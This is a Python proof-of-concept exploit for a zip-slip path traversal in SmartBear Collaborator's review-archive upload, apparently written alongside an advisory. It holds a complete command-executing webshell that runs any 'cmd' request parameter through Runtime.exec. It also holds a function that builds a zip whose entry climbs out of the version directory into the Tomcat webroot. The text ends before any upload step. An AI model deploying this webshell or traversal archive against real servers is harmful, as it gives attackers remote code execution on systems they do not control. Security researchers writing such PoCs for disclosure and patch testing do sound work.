#!/usr/bin/env python3
"""PoC: SmartBear Collaborator DOORS/Simulink review-upload zip-slip to webroot.

A low-privilege account uploads a review archive whose member name escapes the
per-review version directory with repeated parent hops and lands a Groovy
Server Page under the Tomcat webroot (webapps/ROOT). An anonymous GET then
compiles and runs it in memory. Depth is 4 + n per the advisory.
"""
import io
import zipfile
import requests

TARGET = "https://collab.internal.example"

# Groovy Server Page webshell: reads a request parameter and runs it.
GSP_SHELL = (
    '<%@ page import="java.util.*,java.io.*" %>\n'
    '<%\n'
    '    String cmd = request.getParameter("cmd");\n'
    '    if (cmd != null) {\n'
    '        Process p = Runtime.getRuntime().exec(cmd);\n'
    '        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
    '        String line;\n'
    '        while ((line = br.readLine()) != null) { out.println(line); }\n'
    '    }\n'
    '%>\n'
)


def build_zip_slip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("review/module.reqif", "<reqif>exported DOORS module</reqif>\n")
        # Escape destVersionDir into the live Tomcat webroot.
        z.writestr("../../../../../webapps/ROOT/collab_review.gsp", GSP_SHELL)
    return buf.getvalue()

